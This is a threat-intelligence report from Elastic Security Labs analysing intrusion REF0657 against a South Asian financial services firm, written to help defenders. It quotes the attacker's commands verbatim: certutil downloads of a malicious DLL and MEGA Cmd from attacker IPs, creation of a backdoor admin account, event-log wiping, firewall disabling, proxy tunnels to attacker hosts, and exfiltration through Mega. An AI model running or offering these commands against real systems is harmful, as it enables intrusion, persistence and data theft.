---
title: "Unmasking a Financial Services Intrusion: REF0657"
slug: "unmasking-financial-services-intrusion-ref0657"
subtitle: "Elastic Security Labs details an intrusion leveraging open-source tooling and different post-exploitation techniques targeting the financial services industry in South Asia."
date: "2024-01-31"
description: "Elastic Security Labs details an intrusion leveraging open-source tooling and different post-exploitation techniques targeting the financial services industry in South Asia."
author:
  - slug: daniel-stepanic
  - slug: salim-bitam
  - slug: andrew-pease
image: "photo-edited-08@2x.jpg"
category:
  - slug: attack-pattern
tags:
  - ref0657
  - nps
  - cobalt strike
  - iox
  - rakshasa
  - supershell
---

## Preamble

In December of 2023, Elastic Security Labs detected a smash-and-grab style intrusion directed at a financial services organization in South Asia. Throughout the breach, a diverse set of open-source tools were employed within the victim's environment, some of which we encountered for the first time. The threat group engaged in different post-compromise activities: from discovery/enumeration to utilizing the victim's internal enterprise software against them and eventually leveraging different tunnelers and side-loading techniques to execute Cobalt Strike. In addition, the adversary used the file hosting service Mega to exfiltrate data from the network.

By disclosing the details of this intrusion set (REF0657) and the various tactics, techniques, and procedures (TTPs), we hope to assist fellow defenders and organizations in recognizing and monitoring this type of activity. 

### Key takeaways

* REF0657 targeted financial services in South Asia
* This group leveraged a broad range of post-compromise behaviors, including backdoor access using Microsoft SQL Server, dumping credentials, wiping event logs, and exfiltrating data using MEGA CMD
* The activity included an assortment of network tunnelers and proxy tools as well as Cobalt Strike and ties to infrastructure using the C2 framework, Supershell

## Campaign analysis 

Our team identified the initial enumeration happening in a customer environment on December 17, 2023. While we didn't have visibility around the root cause of the infection, we continued to monitor the environment. Over the next several weeks, we discovered seven different hosts, mainly servers, exhibiting a large swath of activity, including:

* Discovery/enumeration
* Downloading additional tools/components
* Renaming and staging tools in legitimate folder locations in the environment
* Dumping credentials from the registry and adding users to machines
* Modifying the environment to enable lateral movement and persistence
* Executing proxy tunnelers and shellcode to maintain access into the environment
* Compressing and exfiltrating data using cloud services provider Mega
* Wiping event logs on multiple machines 

## Execution Flow / Timeline

A significant portion of the activity observed by our team came through command-line execution abusing Microsoft SQL Server (`sqlservr.exe`). While we couldn’t pinpoint the root cause, we have reason to believe the attacker gained access to the environment through this remotely accessible server and then started executing commands and running programs using the MSSQL’s stored procedure (`xp_cmdshell`). This initial endpoint served as the beachhead of the attack where all activity seemed to originate from here.

### Discovery/Enumeration/Staging

The threat actor used several standard Windows utilities for initial discovery and enumeration. The following graphic shows the different commands spawned from the parent process (`sqlservr.exe`):

![Observed command-lines associated with discovery](/assets/images/unmasking-financial-services-intrusion-ref0657/image9.png "Observed command-lines associated with discovery")


Oftentimes, the attacker checked to verify their payloads were running, reviewed network connections on victim machines, and performed directory listings to check on their different files.

After initial access was gained, the actor tried several methods for downloading additional payloads and tooling. The adversary started to use `certutil.exe` and then moved to `bitsadmin.exe`, PowerShell’s `DownloadFile()` method, and eventually back to `certutil.exe`. These different tools interacted with IP addresses (`149.104.23[.]17` and `206.237.3[.]150`).

![Observed command-lines associated with staging](/assets/images/unmasking-financial-services-intrusion-ref0657/image10.png "Observed command-lines associated with staging")


### Lateral Movement + Persistence

As the actors moved in the environment, they leveraged remote SMB and WMI to create a local administrator account named "helpdesk" on each machine. In some cases, they set up a randomly named Windows service (`qLVAMxSGzP`) as a persistence mechanism. This service would execute a temporary batch file with commands to add a local user and insert this user into the local administrator group. After execution, the file would then be deleted. 

```
%COMSPEC% /Q /c echo net user helpdesk P@ssw0rd /add && \ 
net localgroup administrators helpdesk /add \ 
^> \\127.0.0.1\C$\FOUGTZ 2^>^&1 > %TEMP%\VOruiL.bat & \ 
%COMSPEC% /Q /c %TEMP%\VOruiL.bat & %COMSPEC% /Q /c del %TEMP%\VOruiL.bat
```

### Execution

The adversary moved to Cobalt Strike for C2 and further execution. This time, they used a legitimately signed version of Trend Micro’s Deep Security Monitor (`ds_monitor.exe`). This was used to load Cobalt Strike by side-loading a malicious DLL (`msvcp140.dll`). We observed the download of the DLL from a `certutil.exe` execution, and then we confirmed this behavior via call stack telemetry.

```
"C:\Windows\system32\cmd.exe" /c certutil -urlcache -split -f \ 
ht""""tp://206.237.3[.]150:443/1.txt \ 
C:\users\public\downloads\msvcp140.dll
```

The screenshot below shows that the actor placed the TrendMicro application inside a directory labeled McAfee in ProgramData. We can see the malicious DLL being loaded from the same directory by checking the call stack.

![Malicious DLL side-loading of msvcp140.dll](/assets/images/unmasking-financial-services-intrusion-ref0657/image2.png "Malicious DLL side-loading of msvcp140.dll")


Shortly after, Run Key persistence was added to execute (`ds_monitor.exe`) on system startup.

```
reg  add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v \ 
TrendMicro /t REG_SZ /d \ 
"C:\ProgramData\McAfee\TrendMicro\ds_monitor.exe" /f /reg:64
```

An analysis on `msvcp140.dll` reveals that the threat actor tampered with the DllEntryPoint of the legit Windows DLL by substituting it with modified code sourced from a public [repository](https://github.com/ShadowMccc/MemoryEvasion) - this is a custom Cobalt Strike memory evasion loader.

![Decompiled Sleep Obfuscation loading Cobalt Strike](/assets/images/unmasking-financial-services-intrusion-ref0657/image6.png "Decompiled Sleep Obfuscation loading Cobalt Strike")


While the original code retrieved the Cobalt Strike beacon from memory, the altered version loads a beacon in base64 format from a file named `config.ini` that connects to `msedge[.]one`.

### Dumping credentials

One of the main methods observed for gathering credentials was dumping the Security Account Manager (SAM) registry hive on different servers.

![Events showing SAM registry dump](/assets/images/unmasking-financial-services-intrusion-ref0657/image11.png "Events showing SAM registry dump")


### Network/Registry/Logging Modifications 

The threat actor modified several different configurations and settings to help further increase their access to the environment. One of our first observations of this behavior was [enabling RDP](https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-localsessionmanager-fdenytsconnections) (set value to 0) through the registry at the following path (`HKLM\SYSTEM\ControlSet001\Control\Terminal Server\fDenyTSConnections)`. Then, they disabled the Windows Firewall rules using the command:` NetSh Advfirewall set allprofiles state off`.

Afterward, they enabled [Restricted Admin](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn408190(v=ws.11)#restricted-admin-mode-for-remote-desktop-connection) mode through a registry modification, this allowed the adversary to conduct pass-the-hash style attacks against Remote Desktop Protocol (RDP). 

```
cmd.exe /Q /c REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" \ 
/v DisableRestrictedAdmin /t REG_DWORD /d 00000000 \ 
/f 1> \\127.0.0.1\C$\Windows\Temp\RExePi 2>&1
```

In addition to these changes, the attacker also wiped the Windows event logs for System and Security notifications using the Windows Event Utility, `wevtutil.exe`:

```
cmd.exe /Q /c wevtutil.exe cl System 1> \ 
\\127.0.0.1\C$\Windows\Temp\ksASGt 2>&1

cmd.exe /Q /c wevtutil.exe cl Security 1> \ 
\\127.0.0.1\C$\Windows\Temp\uhxJiw 2>&1
```

### Tunneling/Proxy Tools

After a day of initial access, the adversary generated several shellcode injection alerts using `AppLaunch.exe` (a binary that manages and executes applications built with Microsoft's .NET Framework) and outputting the results to a file called `1.txt`. The command line argument associated with this alert is as follows: `c:\programdata\AppLaunch.exe proxy -r 206.237.0[.]49:12355 >> 1.txt`

After examining the injected code, we identified the shellcode as a Golang binary known as `iox`, which can be compiled from the following publicly available [repository](https://github.com/EddieIvan01/iox). This tool is designed for port forwarding and proxying with additional features such as traffic encryption. Based on the observed command line, the attacker established a proxy connection to `206.237.0[.]49` on port `12355`.

Intended or not, the proxy utility was launched by several different legitimate processes: `lsass.exe`, `vmtoolsd.exe`, and `mctray.exe`. In this case, the threat actor side-loaded a common malicious unsigned DLL (`mscoree.dll`) located in the `C:\programdata\` directory.

![Malicious DLL side-loading of mscoree.dll](/assets/images/unmasking-financial-services-intrusion-ref0657/image5.png "Malicious DLL side-loading of mscoree.dll")


The actor employed another proxy known as [Rakshasa](https://github.com/Mob2003/rakshasa), downloaded directly from the tool's official GitHub page using the `certutil` command. It was stored in `c:\users\public\downloads\ra.exe`, and then executed with the following command:
`C:\Windows\system32\cmd.exe /C C:\Users\Public\Downloads\ra.exe -d 149.104.23[.]176:80`.

This command creates a proxy tunnel to the threat actor infrastructure, connecting to the IP address `149.104.23.176` on port `80`. If that wasn’t enough, the actor started to send and retrieve data from the network through ICMP tunneling. For example, when the actor executed the tasklist command, the output was saved to `C:\programdata\re.txt`, and exfiltrated through ICMP using PowerShell.

![ICMP tunneling script using PowerShell](/assets/images/unmasking-financial-services-intrusion-ref0657/image8.png "ICMP tunneling script using PowerShell")


### Exfiltration

One of the more noteworthy parts of this intrusion was centered around the adversary downloading [MEGA Cmd](https://mega.io/cmd), a command-line utility that works with the Mega file hosting service. While still leveraging MSSQL, they downloaded this program, renaming it to `ms_edge.exe`.

```
"C:\Windows\system32\cmd.exe" /c certutil -urlcache -split -f \ 
ht""""tp://206.237.3.150:443/megacmd.exe \ 
C:\users\public\downloads\ms_edge.exe
```

Shortly after, we observed this utility being executed with an argument to a configuration file (called `tmp`) and a compressed file stored with a backup extension (`.bak`) being used in conjunction with Mega.

```
C:\users\public\downloads\ms_edge.exe  --config \ 
C:\users\public\downloads\tmp copy \ 
REDACTED_FILENAME.bak mega_temp:
```

### Infrastructure

Throughout this investigation, the threat group used several servers to host their payloads or forward network traffic. The Elastic Security Labs team discovered two web servers with open directories hosting files publicly reachable on: 

* `206.237.3[.]150`
* `206.237.0[.]49` 

![Open directory at 206.237.3[.]150](/assets/images/unmasking-financial-services-intrusion-ref0657/image3.png "Open directory at 206.237.3[.]150")


In addition, our team observed [Supershell](https://github.com/tdragon6/Supershell/tree/main) panel, a Chinese-based C2 platform running on `206.237.[0].49:8888`.

![Supershell Panel on 206.237.0[.]49](/assets/images/unmasking-financial-services-intrusion-ref0657/image1.png "Supershell Panel on 206.237.0[.]49")


We validated an earlier finding in the previous section when we found a configuration file (referred to as `tmp` in the Exfiltration section) used for automation with the Mega platform containing credentials used by the adversary. As well, there was a variety of web shell files and scripts originating from the following public repositories:

* [https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md#abusing-ssrf-in-aws-ec2-environment](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md#abusing-ssrf-in-aws-ec2-environment)
* [https://github.com/tutorial0/WebShell/blob/master/Aspx/ASPXspy.aspx](https://github.com/tutorial0/WebShell/blob/master/Aspx/ASPXspy.aspx)
* [https://github.com/L-codes/Neo-reGeorg/blob/master/templates/tunnel.ashx](https://github.com/L-codes/Neo-reGeorg/blob/master/templates/tunnel.ashx)

Furthermore, within these directories, we identified a few interesting binaries:

**cloud_init**

One of the files (`cloud_init`) is a Golang ELF binary packed with UPX. After inspection, it was determined that it was compiled from the [NPS repository](https://github.com/ehang-io/nps/tree/master), another intranet proxy server compatible with most common protocols. The threat actor altered the code to encrypt the strings during compilation. The decryption process uses separate byte arrays where the bytes of one array are combined with the bytes of the other array, employing operations such as addition, XOR, or subtraction for the decryption.

![NPS string obfuscation example](/assets/images/unmasking-financial-services-intrusion-ref0657/image4.png "NPS string obfuscation example")


**MSASN1.dll**

After review, this DLL matched the same functionality/code as the previously discussed file (`msvcp140.dll`).

### REF0657 through MITRE ATT&CK

Elastic uses the [MITRE ATT&CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.

#### Tactics

Tactics represent the why of a technique or sub-technique. The adversary’s tactical goal is the reason for performing an action. The tactics observed in REF0657 were:

* [Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
* [Persistence](https://attack.mitre.org/tactics/TA0003/)
* [Execution](https://attack.mitre.org/tactics/TA0002/)
* [Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
* [Discovery](https://attack.mitre.org/tactics/TA0007)
* [Command and Control](https://attack.mitre.org/tactics/TA0011)
* [Exfiltration](https://attack.mitre.org/tactics/TA0010/)

#### Techniques

Techniques represent how an adversary achieves a tactical goal by performing an action. Elastic Security Labs observed the following techniques within REF0657:

* [Command and Scripting Interpreter: Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
* [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
* [Masquerading](https://attack.mitre.org/techniques/T1036/)
* [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)
* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)
* [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
* [Hijack Execution Flow: DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)

## Summary

In summary, this intrusion highlighted some new tooling while re-emphasizing that not all intrusions are dictated by novel malware and techniques. These types of threats demonstrate the real-world challenges most organizations are faced with daily.  

The threat group moved very quickly in this environment, where within almost 24 hours, meaningful data to the attacker was extracted from the network. Sharing some of these details can help defenders plug possible holes or gaps in coverage from some of these techniques.

### The Diamond Model

Elastic Security Labs utilizes the [Diamond Model](https://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf) to describe high-level relationships between the adversaries, capabilities, infrastructure, and victims of intrusions. While the Diamond Model is most commonly used with single intrusions, and leveraging Activity Threading (section 8) as a way to create relationships between incidents, an adversary-centered (section 7.1.4) approach allows for a, although cluttered, single diamond.

![REF0657 - Diamond Model](/assets/images/unmasking-financial-services-intrusion-ref0657/image7.png "REF0657 - Diamond Model")


## Detecting REF0657

The following detection rules and behavior prevention events were observed throughout the analysis of this intrusion set:

### Detection

* [Direct Outbound SMB Connection](https://www.elastic.co/guide/en/security/current/direct-outbound-smb-connection.html#direct-outbound-smb-connection)
* [Execution via MSSQL xp_cmdshell Stored Procedure](https://www.elastic.co/guide/en/security/current/execution-via-mssql-xp-cmdshell-stored-procedure.html)
* [Execution via Renamed Signed Binary Proxy](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_execution_via_renamed_signed_binary_proxy.toml)
* [Potential Remote Credential Access via Registry](https://www.elastic.co/guide/en/security/current/potential-remote-credential-access-via-registry.html)
* [Process Execution from an Unusual Directory](https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html)
* [Suspicious CertUtil Commands](https://www.elastic.co/guide/en/security/current/suspicious-certutil-commands.html)
* [WMI Incoming Lateral Movement](https://www.elastic.co/guide/en/security/current/wmi-incoming-lateral-movement.html)

### Prevention

* [Ingress Tool Transfer via INET Cache](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/command_and_control_ingress_tool_transfer_via_inet_cache.toml)
* [Potential Masquerading as Windows Error Manager](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_potential_masquerading_as_windows_error_manager.toml)
* [Potential Lateral Movement via SMBExec](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_potential_lateral_movement_via_smbexec.toml)
* [Suspicious Cmd Execution via WMI](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_suspicious_cmd_execution_via_wmi.toml)
* [RunDLL32 with Unusual Arguments](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_rundll32_with_unusual_arguments.toml)
* [Suspicious PowerShell Execution](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_suspicious_powershell_execution.toml)

### Hunting queries in Elastic

Hunting queries could return high signals or false positives. These queries are used to identify potentially suspicious behavior, but an investigation is required to validate the findings.

#### ES|QL queries

Using the Timeline section of the Security Solution in Kibana under the “Correlation” tab, you can use the below ES|QL queries to hunt for similar behaviors:

```
FROM logs-*
  WHERE process.parent.name == "sqlservr.exe" 
  AND process.name == "cmd.exe" 
  AND process.command_line 
  RLIKE ".*certutil.*"
```

```
FROM logs-*
  WHERE process.name == "ms_edge.exe" 
  AND process.code_signature.exists == false 
  AND NOT process.executable 
  RLIKE ".*Program Files.*"
```

#### YARA

Elastic Security has created the following YARA rules to identify this activity:

* [Windows.Trojan.CobaltStrike](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar)
* [Windows.Hacktool.SleepObfLoader](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_SleepObfLoader.yar)
* [Multi.Hacktool.Nps](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Multi_Hacktool_Nps.yar)
* [Multi.Hacktool.Rakshasa](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Multi_Hacktool_Rakshasa.yar)
* [Windows.Hacktool.Iox](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_Iox.yar)

## Observations

All observables are also available for [download](https://github.com/elastic/labs-releases/tree/main/indicators/ref0657) in both ECS and STIX format in a combined zip bundle.

The following observables were discussed in this research.

| Observable                                                       | Type        | Name        | Reference                                  |
|------------------------------------------------------------------|-------------|-------------|--------------------------------------------|
| 206.237.3[.]150                                                  | ipv4-addr   |             | File hosting infrastructure                |
| 206.237.0[.]49                                                   | ipv4-addr   |             | File hosting and supershell infrastructure |
| 104.21.54[.]126                                                  | ipv4-addr   |             | Cobalt Strike infrastructure               |
| 149.104.23[.]176                                                 | ipv4-addr   |             |                                            |
| msedge[.]one                                                     | domain-name |             | Cobalt Strike infrastructure               |
| bc90ef8121d20af264cc15b38dd1c3a866bfe5a9eb66064feb2a00d860a0e716 | SHA-256     | mscoree.dll |                                            |
| 84b3bc58ec04ab272544d31f5e573c0dd7812b56df4fa445194e7466f280e16d | SHA-256     | MSASN1.dll  |                                            |

## About Elastic Security Labs

Elastic Security Labs is the threat intelligence branch of Elastic Security dedicated to creating positive change in the threat landscape. Elastic Security Labs provides publicly available research on emerging threats with an analysis of strategic, operational, and tactical adversary objectives, then integrates that research with the built-in detection and response capabilities of Elastic Security.

Follow Elastic Security Labs on Twitter [@elasticseclabs](https://twitter.com/elasticseclabs?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor) and check out our research at [www.elastic.co/security-labs/](https://www.elastic.co/security-labs/). 